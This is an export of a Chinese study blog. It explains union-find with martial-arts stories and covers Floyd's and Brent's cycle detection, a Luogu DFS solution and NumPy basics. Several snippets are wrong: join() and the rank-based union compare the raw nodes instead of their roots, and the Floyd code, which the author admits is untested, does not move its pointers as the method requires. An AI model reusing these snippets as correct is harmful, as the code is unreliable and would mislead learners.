<p>​	但是新的问题又来了，原本互不相识的两个人如何辨别是否共属同一门派呢?<br>
​    这好办！我们可以先在门派中选举一个“大哥”作为话事人（也就是掌门人，或称教主等）。这样一来，每当要打架的时候，决斗双方先自报家门，说出自己所在门派的教主名称，如果名称相同，就说明是自己人，就不必自相残杀了，否则才能进行决斗。于是，教主下令将整个门派划分为三六九等，使得整个门派内部形成一个严格的等级制度（即树形结构）。教主就是根节点，下面分别是二级、三级、……、N级队员。每个人只需要记住自己的上级名称，以后遇到需要辨别敌友的情况时，只需要一层层往上询问（网上询问）就能知道是否是同道中人了。</p>
<p>​	以上的教主被称为代表元</p>
<h2 id="find-函数"><a class="header-anchor" href="#find-函数">¶</a>find()函数</h2>
<p>故事引入：<br>
子夜，小昭于骊山下快马送信，发现一头戴竹笠之人立于前方，其形似黑蝠，倒挂于树前，甚惧，正系拔剑之时，只听四周悠悠传来：“如此夜深，姑凉竟敢擅闯明教，何不下坐陪我喝上一盅？”。小昭听闻，后觉此人乃明教四大护法之一的青翼蝠王韦一笑，答道：“在下小昭，乃紫衫龙王之女”。蝠王轻惕，急问道：“尔等既为龙王之女，故同为明教中人。敢问阁下教主大名，若非本教中人，于明教之地肆意走动那可是死罪！”。小昭吓得赶紧打了个电话问龙王：“龙王啊，咱教主叫啥名字来着？”，龙王答道：“吾教主乃张无忌也！”，小昭遂答蝠王：“张无忌！”。蝠王听后，抱拳请礼以让之。<br>
在上面的情境中，小昭向他的上级（紫衫龙王）请示教主名称，龙王在得到申请后也向他的上级（张无忌）请示教主名称，此时由于张无忌就是教主，因此他直接反馈给龙王教主名称是“张无忌”。同理，青翼蝠王也经历了这一请示过程。<br>
在并查集中，用于查询各自的教主名字的函数就是我们的find()函数。find(x)的作用是用于查找某个人所在门派的教主，换言之就是用于对某个给定的点x，返回其所属集合的代表。</p>
<p>实现：</p>
<p>​    这里我们定义了一个数组pre[]，将每个人进行编号，然后每个编号对应的值是他的上级，如果上级是自己，就说明他是代表元</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(pre[x]!=x)</span><br><span class="line">	&#123;</span><br><span class="line">		x=pre[x];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="join-函数"><a class="header-anchor" href="#join-函数">¶</a>join()函数</h2>
<p>故事引入：<br>
虚竹和周芷若是我个人非常喜欢的两个人物，他们的教主分别是玄慈方丈和灭绝师太，但是显然这两个人属于不同门派，但是我又不想看到他们打架。于是，我就去问了下玄慈和灭绝：“你看你们俩都没头发，要不就做朋友吧”。他们俩看在我的面子上同意了，这一同意非同小可，它直接换来了少林和峨眉的永世和平。</p>
<p>实现：<br>
在上面的情景中，两个已存的不同门派就这样完成了合并。这么重大的变化，要如何实现？要改动多少地方？其实很简单，我对玄慈方丈说：“大师，麻烦你把你的上级改为灭绝师太吧。这样一来，两派原先所有人员的教主就都变成了师太，于是下面的人们也就不会打起来了！反正我们关心的只是连通性，门派内部的结构不要紧的”。玄慈听后立刻就不乐意了：“我靠，凭什么是我变成她手下呀，怎么不反过来？我抗议！”。抗议无效，我安排的，最大。反正谁加入谁效果是一样的，我就随手指定了一个，join()函数的作用就是用来实现这个的。</p>
<p>join(x,y)的执行逻辑如下：</p>
<ol>
<li>寻找 x 的代表元（即教主）；</li>
<li>寻找 y 的代表元（即教主）；</li>
<li>如果 x 和 y 不相等，则随便选一个人作为另一个人的上级，如此一来就完成了 x 和 y 的合并。</li>
</ol>
<p>join(x,y)的实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int join(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">	int fx=find(x);</span><br><span class="line">	int fy=find(y);</span><br><span class="line">	if(x!=y)</span><br><span class="line">		pre[x]=y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>压缩并查集路径</h1>
<h2 id="优化find-函数"><a class="header-anchor" href="#优化find-函数">¶</a>优化find()函数</h2>
<p><strong>现实意义</strong></p>
<p>两个互不相识的大将夏侯惇和许褚碰面了，他们都互相看不惯，想揍对方。于是按照江湖规矩，先打电话问自己的上级：“你是不是教主？” 上级说：“我不是呀，我的上级是***，我帮你问一下。” 就这样两个人一路问下去，直到最终发现他们的教主都是曹操。具体结构如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164510579.png" alt="image-20220326164510579"></p>
<p>“失礼失礼，原来是自己人，在下军机处前将军夏侯惇!”<br>
“幸会幸会，不打不相识嘛，在下军情处上将许褚！”<br>
紧接着，两人便高高兴兴地手拉手喝酒去了。<br>
“等等等等，两位同学请留步，还有事情没完成呢！”我叫住他俩：“还要做路径压缩！”<br>
两人醒悟，夏侯惇赶紧打电话给他的上级郭嘉：“军师啊，我查过了，我们的教主都是曹丞相。不如我们直接拜在丞相手下吧，省得级别太低，以后找起来太麻烦。”郭嘉答道：“所言甚是” 。<br>
许褚接着也打电话给刚才拜访过的荀彧，做了同样的事。于是此时，整个曹操阵营的结构如下所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164534204.png" alt="image-20220326164534204"></p>
<p>这样一来，在刚才查询过程中涉及到的人物就都聚集在了曹操的直接领导下，以后再需要查询教主名称的时候，就只需要询问一级便可得到。所以，在经过一次查询后，整个门派树的高度都将大大降低，路径压缩所实现的功能就是这么个意思。</p>
<p><strong>实现：</strong></p>
<p>根据上面的大大给出的精彩的解释，我们只需要在寻找过程中将所有人的直接上级改成代表元即可，这个时候就应该考虑用递归了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(pre[x]==x)</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	<span class="keyword">return</span> pre[x]=find(pre[x]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>缺点：</strong></p>
<p>这种方法的缺点就是在第一次寻找的时候没有任何的优化</p>
<h2 id="加权标记法"><a class="header-anchor" href="#加权标记法">¶</a>加权标记法</h2>
<p><strong>大体含义</strong></p>
<p>其实就是在额外增加一个rank[]数组，记录每个点在树中的高度，在合并的时候根据权值来决定谁当老大，这里其实只用优化合并的函数</p>
<p><strong>代码实现：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fx=find(x),fy=find(y);</span><br><span class="line">	<span class="keyword">if</span>(x==y) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(rank[fx]&gt;rank[fy])</span><br><span class="line">		pre[fy]=fx;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(rank[fx]==rank[fy]) rank[fy]++;</span><br><span class="line">		pre[fx]=fy;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>总结</h1>
<ol>
<li>并查集的用处，判断是否连通，求连通分量个数</li>
<li>注意两种优化方法，个人觉得优化find()函数虽然有弊端，但是相对而言开销要小些</li>
</ol>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>特殊数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>特殊数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>弗洛依德的兔子与乌龟算法</title>
    <url>/2021/09/25/%E5%BC%97%E6%B4%9B%E4%BE%9D%E5%BE%B7%E7%9A%84%E5%85%94%E5%AD%90%E4%B8%8E%E4%B9%8C%E9%BE%9F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="Tortoise-and-the-Hare-algorithm"><a href="#Tortoise-and-the-Hare-algorithm" class="headerlink" title="Tortoise and the Hare algorithm"></a>Tortoise and the Hare algorithm</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>​    Floyd判圈算法，用来在有限状态机、迭代函数或者链表上判断是否有环的算法。</p>
<h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><p>​    其实主要是利用双指针，乌龟和兔子在一个含环的跑道上进行比赛，乌龟在单位时间内移动一步，兔子移动两步，两者同时出发，如果存在环的话，乌龟总能和兔子相遇</p>
<h2 id="具体想法"><a href="#具体想法" class="headerlink" title="具体想法"></a>具体想法</h2><h3 id="判断是否有环"><a href="#判断是否有环" class="headerlink" title="判断是否有环"></a>判断是否有环</h3><p>​    定义双指针<strong>p1</strong>和<strong>p2</strong>，起始时指向头结点，然后p1每次移动1个，p2每次移动两个，如果p2移动到尾端的时候未与p1相遇，则不存在环，否则有环</p>
<h3 id="求环的长度"><a href="#求环的长度" class="headerlink" title="求环的长度"></a>求环的长度</h3><p>​    p1固定在相遇位置C，移动p2，每次移动1个长度，计数即可</p>
<h3 id="环的起点"><a href="#环的起点" class="headerlink" title="环的起点"></a>环的起点</h3><p>​    此时将一个指针移到表头结点，另一个指针在相遇节点，然后两者每次均移动一个单位，再次相遇时的位置就是环的起点位置</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>​    其实实现起来也非常简单</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="built_in">list</span> next;</span><br><span class="line">&#125; * <span class="built_in">list</span>,listnode;</span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"><span class="built_in">list</span> ans;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">function</span><span class="params">(<span class="built_in">list</span> head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span> p, q;</span><br><span class="line">    p = head, q = head;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        q = p-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(q==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p==q)</span><br><span class="line">        &#123;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">            q = q-&gt;next;</span><br><span class="line">            <span class="keyword">while</span>(p!=q)</span><br><span class="line">            &#123;</span><br><span class="line">                q = q-&gt;next;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;<span class="comment">//该循环用来求环的长度</span></span><br><span class="line">            p = head;</span><br><span class="line">            <span class="keyword">while</span>(p!=q)</span><br><span class="line">            &#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">                q = q-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = p;<span class="comment">//该循环用来求环的起点</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">list</span> <span class="title">creat</span><span class="params">()</span></span>;<span class="comment">//创建有环链表</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span> head = creat();</span><br><span class="line">    <span class="keyword">if</span>(function(head))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no cycle!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;have cycle!\nlength:%d\nstarting:%d\n&quot;</span>,count,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong><del>当然这里我没有数据，也不知道自己随手写的代码对不对</del></strong></p>
<h2 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><p>​    空间复杂度：$O(1)$</p>
<p>​    时间复杂度：$O(m+n)$</p>
<p>​    这里的分析非常简单，具体的可以看<a href="[弗洛伊德的兔子与乌龟(Floyd’s Tortoise and the Hare algorithm"></a> – Onwaier‘s Blog](<a href="http://onwaier.com/?p=528">http://onwaier.com/?p=528</a>))</p>
<h1 id="Brent算法"><a href="#Brent算法" class="headerlink" title="Brent算法"></a>Brent算法</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    也是一种找环算法，并且比Floyd算法的效率高了一些</p>
<h2 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h2><p>​    相比于Floyd算法，Brent的兔子移动而乌龟静止，到达传送时间时，乌龟移动到兔子所在的地方，然后传送时间t翻倍，最终如果兔子能够到达终点，则表示不存在环，如果兔子与乌龟相遇则表示有环。根据考虑，首先最开始的时间间隔应该是2，因为环的长度至少为1</p>
<h2 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h2><p>​    这里仅仅给出判圈函数的代码吧，然后后面的求长度和求起点和Floyd算法是一样的，不再赘述</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">function</span><span class="params">(List head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">list</span> p,q;</span><br><span class="line">	p=head,q=head;</span><br><span class="line">	<span class="keyword">int</span> steps=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> limit =<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;q!=<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="keyword">if</span>(p==q)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		steps++;</span><br><span class="line">		<span class="keyword">if</span>(steps==limit)</span><br><span class="line">		&#123;</span><br><span class="line">			q=p;</span><br><span class="line">			steps=<span class="number">0</span>;</span><br><span class="line">			limit*=<span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><p>​    空间复杂度：$O(1)$</p>
<p>​    时间复杂度：$O(m+n)$</p>
<p>​    <strong>这里贴一个Brent算法更快的证明，<a href="[brent算法为什么比floyd算法快_流的博客-CSDN博客_brent算法](https://blog.csdn.net/qq_35688140/article/details/86586035"></a>)</strong></p>
<p>​    其实思路是非常简单的，首先论证两个算法，乌龟都跑不完一圈，然后论证Brent算法每秒兔子都要多跑一点即可</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>不常见算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>不常见算法</tag>
      </tags>
  </entry>
  <entry>
    <title>搜索算法刷题记录</title>
    <url>/2021/10/16/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1>洛谷P3315</h1>
<h2 id="题目大意"><a class="header-anchor" href="#题目大意">¶</a>题目大意</h2>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326171323489.png" alt="image-20220326171323489"></p>
<h2 id="主要思路"><a class="header-anchor" href="#主要思路">¶</a>主要思路</h2>
<p>​	其实这一道题很明显用DFS或BFS都是可以的，这里记录一下主要是因为memset函数，该函数赋值的时候是一个字节一个字节去赋值的，所以你为他赋1，其实赋的是0x01010101，这是需要注意的一个点，然后一般都用它将数组赋值为0或-1，这样不会有冲突，然后就是这道题需要一个简单地剪枝</p>
<h2 id="代码如下"><a class="header-anchor" href="#代码如下">¶</a>代码如下</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a,b) ((a)&gt;(b)?(b):(a))</span></span><br><span class="line"><span class="keyword">int</span> n, a, b;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now, <span class="keyword">int</span> num)</span></span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">210</span>];</span><br><span class="line"><span class="keyword">int</span> aa[<span class="number">201</span>];</span><br><span class="line"><span class="comment">// int ans;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;a, &amp;b);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;aa[i]),dp[i]=INT_MAX;</span><br><span class="line">    dfs(a, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(dp[b]==INT_MAX)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, dp[b]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(now==b)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[now] = min(dp[now], num);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num&gt;=dp[now])</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dp[now] = num;</span><br><span class="line">    <span class="keyword">if</span>(now-aa[now]&gt;=<span class="number">1</span>)</span><br><span class="line">        dfs(now - aa[now], num + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(now+aa[now]&lt;=n)</span><br><span class="line">        dfs(now + aa[now], num + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
        <category>搜索</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>搜索</tag>
      </tags>
  </entry>
  <entry>
    <title>数据处理与可视化</title>
    <url>/2021/10/12/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E4%B8%8E%E5%8F%AF%E8%A7%86%E5%8C%96/</url>
    <content><![CDATA[<h1>NumPy</h1>
<p>​	首先列表可以完成数组操作，但是在数据量大的时候速度很慢，所以这里采用NumPy拓展库完成数组操作。</p>
<p>​	NumPy提供两种基本对象，即<strong>ndarray</strong>和<strong>ufunc</strong>，前者是存储单一数据类型的多维数组，后者是能够对数组进行处理的通用函数。</p>
<h2 id="数组的创建、属性和操作"><a class="header-anchor" href="#数组的创建、属性和操作">¶</a>数组的创建、属性和操作</h2>
<h3 id="创建数组"><a class="header-anchor" href="#创建数组">¶</a>创建数组</h3>
<p>​	首先通过<strong>array</strong>函数实现创建数组，如果传入为列表或元组，构造一维数组；如果传入多个嵌套的列表或元组，则可以构造一个二维数组。下面给出创建数组的例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a=np.array([<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">20</span>,<span class="number">16</span>,<span class="number">30</span>])</span><br><span class="line">b=np.array(((<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>),(<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>)))</span><br></pre></td></tr></table></figure>
<p>​	然后还有别的创建数组的函数，例如<strong>arange</strong>，<strong>empty</strong>，<strong>linspace</strong>，这些函数都包含参数<strong>dtype</strong>，用来指定创建的数组的类型，可以参见如下的例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c=np.arange(<span class="number">0</span>,<span class="number">10</span>,<span class="number">2</span>,dtype=<span class="built_in">int</span>)<span class="comment">#创建整型数组[0,2,4,6,8]</span></span><br><span class="line">d=np.empty((<span class="number">2</span>,<span class="number">3</span>),<span class="built_in">int</span>)<span class="comment">#创建2*3整形空矩阵</span></span><br><span class="line">e=np.linspace(<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>) <span class="comment">#这里主要用来生成一个序列，而且很好的避免了精度的损失</span></span><br><span class="line">f=np.random.randint(<span class="number">0</span>,<span class="number">3</span>,(<span class="number">2</span>,<span class="number">3</span>))<span class="comment">#生成[0,3)上的2行3列随机整数数组</span></span><br></pre></td></tr></table></figure>
<p>​	需要注意empty函数仅仅分配内存而不赋值，所以返回矩阵数值唯一。</p>
<p>​	另外这里简单提一下<strong>mgrid</strong>函数，主要用来返回多维数组，传入的分片有多少个就是多少维数组，返回多值，且以矩阵的形式返回，第一返回值返回第一维数据最终的情况，以此类推即可</p>
<h3 id="数组的属性"><a class="header-anchor" href="#数组的属性">¶</a>数组的属性</h3>
<p>​	主要有这么几个属性，<strong>ndim</strong>返回数组维数，<strong>shape</strong>返回元组，表示数组的尺寸，<strong>size</strong>返回数组元素数量，其实就是shape返回元组中各元素的乘积，<strong>dtype</strong>返回数据类型，<strong>itemsize</strong>返回每个元素的大小</p>
<h3 id="数组的索引"><a class="header-anchor" href="#数组的索引">¶</a>数组的索引</h3>
<p>​	首先，对于一维数组，NumPy提供数组和列表具有相同的切片操作。对于二维数据列表，索引方法为<strong>a[i][j]</strong>，对于array数组元素，用**a[i,j]**引用，然后NumPy还提供了别的索引方式</p>
<ol>
<li>布尔索引，就是在中括号中加入布尔表达式进行筛数</li>
<li>花式索引，索引值是一个数组，一维数组可以索引对应位置的元素，二维数组索引值组合后可以获取对应坐标的元素</li>
</ol>
<h3 id="数组修改"><a class="header-anchor" href="#数组修改">¶</a>数组修改</h3>
<p>​	直接给出下面的例子吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x=np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line">x[<span class="number">2</span>,<span class="number">0</span>]=-<span class="number">1</span> <span class="comment">#直接修改对应元素</span></span><br><span class="line">y=np.delete(x,<span class="number">2</span>,axis=<span class="number">0</span>) <span class="comment">#删除第三行</span></span><br><span class="line">z=np.delete(y,<span class="number">0</span>,axis=<span class="number">1</span>) <span class="comment">#删除第一列</span></span><br><span class="line">t1=np.append(x,[[<span class="number">7</span>,<span class="number">8</span>]],axis=<span class="number">0</span>) <span class="comment">#增加一行</span></span><br><span class="line">t2=np.append(x,[[<span class="number">9</span>],[<span class="number">10</span>],[<span class="number">11</span>]],axis=<span class="number">1</span>) <span class="comment">#增加一列</span></span><br></pre></td></tr></table></figure>
<h3 id="数组变形"><a class="header-anchor" href="#数组变形">¶</a>数组变形</h3>
<p>​	用reshape函数改变数组的维度，参数为一个正整数元组，指定每个维度的大小，注意这里数组本身不变，而是返回了一个视图，而resize函数改变了a数组本身，下面给出例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=np.arange(<span class="number">4</span>).reshape(<span class="number">2</span>,<span class="number">2</span>) <span class="comment">#生成[[0,1],[2,3]]</span></span><br></pre></td></tr></table></figure>
<p>​	将多维数组降维，有三种方法，即<strong>ravel</strong>，<strong>flatten</strong>，<strong>reshape</strong>，下面给出例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(a.reshape(-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(a.ravel())</span><br><span class="line"><span class="built_in">print</span>(a.flatten())</span><br></pre></td></tr></table></figure>
<p>​	三种方法都没有改变数组</p>
<p>​	另外就是可以利用**vstack()<strong>和</strong>hstack()<strong>分别将两个数组竖直组合和水平组合，可以用</strong>hsplit()<strong>和</strong>vsplit()**将数组平均分成两个列数组和行数组</p>
<h2 id="数组的运算"><a class="header-anchor" href="#数组的运算">¶</a>数组的运算</h2>
<h3 id="四则运算和比较运算"><a class="header-anchor" href="#四则运算和比较运算">¶</a>四则运算和比较运算</h3>
<p>​	这部分是对于对应数值的运算，和matlab差不多，除了直接使用运算符，也可以使用相应的函数，此处不再赘述。</p>
<p>​	下面给出一个例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a=np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>],[<span class="number">12</span>,<span class="number">15</span>,<span class="number">1</span>]])</span><br><span class="line">b=np.array([[<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>],[<span class="number">10</span>,<span class="number">20</span>,<span class="number">0</span>]])</span><br><span class="line"><span class="built_in">print</span>(a[a&gt;b])</span><br></pre></td></tr></table></figure>
<h3 id="ufunc函数"><a class="header-anchor" href="#ufunc函数">¶</a>ufunc函数</h3>
<p>​	这是个通用函数，对数组中的所有元素进行逐一操作，<strong>效率更高</strong></p>
<p>​	当然进行逐一运算的前提是数组维数相同，如果不相同，NumPy会实行<strong>广播</strong>机制</p>
<h2 id="随机数的生成"><a class="header-anchor" href="#随机数的生成">¶</a>随机数的生成</h2>
<p>​	Python内置的random模块可以生成随机数，但是更好的是NumPy.random模块的随机数生成函数，可以生成的种类多。</p>
<h2 id="文件读取"><a class="header-anchor" href="#文件读取">¶</a>文件读取</h2>
<h3 id="文本文件的读取"><a class="header-anchor" href="#文本文件的读取">¶</a>文本文件的读取</h3>
<ol>
<li>
<p>**savetxt()**函数可以把1维和2维数数组保存到文本文件中，**loadtxt()**函数可以把文本文件中的数据加载到1维和2维数组中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a=np.arange(<span class="number">1</span>,<span class="number">9</span>,<span class="number">2</span>).reshape(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">np.savetxt(<span class="string">&quot;D:\\text.txt&quot;</span>,a)</span><br><span class="line"></span><br><span class="line">b=np.loadtxt(<span class="string">&quot;D:\\text.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">np.savetxt(<span class="string">&quot;D:\\test.txt&quot;</span>,a,fmt=<span class="string">&quot;%d&quot;</span>,delimiter=<span class="string">&quot;,&quot;</span>) <span class="comment">#默认以空格隔开，格式为浮点型</span></span><br><span class="line">c=np.loadtxt(<span class="string">&quot;D:\\test.txt&quot;</span>,delimiter=<span class="string">&quot;,&quot;</span>) <span class="comment">#加载的时候需要指定分割符</span></span><br></pre></td></tr></table></figure>
<p>然后这两个方法也有dtype的参数，有时候如果文件中含有字符的时候，可以先按字符格式读取，然后对数组用astype()方法转化，其中参数为目标类型</p>
</li>
<li>
<p>**genfromtxt()**函数主要用于读取较为复杂的文本文件，详细的参数等用到的时候再学吧</p>
</li>
</ol>
<h3 id="二进制文件的读取"><a class="header-anchor" href="#二进制文件的读取">¶</a>二进制文件的读取</h3>
<ol>
<li>**tofile()**用来保存，**fromfile()**用来读取，其中读取的时候需要指定元素类型</li>
<li><strong>load()</strong>、**save()<strong>和</strong>savez()**用来存取NumPy专用的二进制格式文件</li>
</ol>
<h1>文件操作</h1>
<h2 id="基本操作"><a class="header-anchor" href="#基本操作">¶</a>基本操作</h2>
<h3 id="打开和关闭文件"><a class="header-anchor" href="#打开和关闭文件">¶</a>打开和关闭文件</h3>
<p>​	用**open()**方法，三个参数依次为文件路径，打开方式，缓冲模式。其中缓冲模式为0表示不缓冲，否则给出缓冲区的大小</p>
<p>​	执行正常的话该函数将会返回1个文件对象，否则抛出异常</p>
<p>​	用**close()**方法关闭函数</p>
<p>​	当然也可以用<strong>with</strong>语句打开数据文件并将其绑定到对象，而不必在操作完后去关闭文件</p>
